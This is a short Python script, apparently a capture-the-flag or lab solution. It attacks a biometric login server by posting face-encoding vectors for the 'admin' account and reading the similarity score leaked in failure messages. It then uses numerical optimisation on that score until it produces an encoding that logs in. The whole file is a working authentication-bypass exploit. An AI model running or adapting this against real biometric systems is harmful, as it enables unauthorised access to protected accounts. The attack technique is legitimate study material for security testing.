import requests
import numpy as np
from scipy.optimize import minimize
import sys

server = sys.argv[1] if len(sys.argv) > 1 else "http://biometric_server:5001"

def main():
    x0 = np.zeros([128]).tolist()
    res = minimize(get_score, x0, method='CG', options={'xtol': 1e-7, 'disp': True})
    print(res)
    res = get_request(res.x)
    print(res)

def get_request(encoding) -> str:
    payload = {"username": "admin", "encoding": encoding.tolist()}
    res = requests.post(server, json=payload)
    return res.content

def get_score(encoding)-> float:
    content = get_request(encoding)
    if str(content).find("Login Failed") < 0:
        res = 0
    else:
        res =  float(str(content).split(":")[-1][:-2].strip())
    return res



    # encoding = np.zeros([128, 1]).tolist()
    # payload = {"username": "admin", "encoding": encoding}

    # res = requests.post("0.0.0.0:5001", json=payload)


if __name__ == '__main__':
    main()
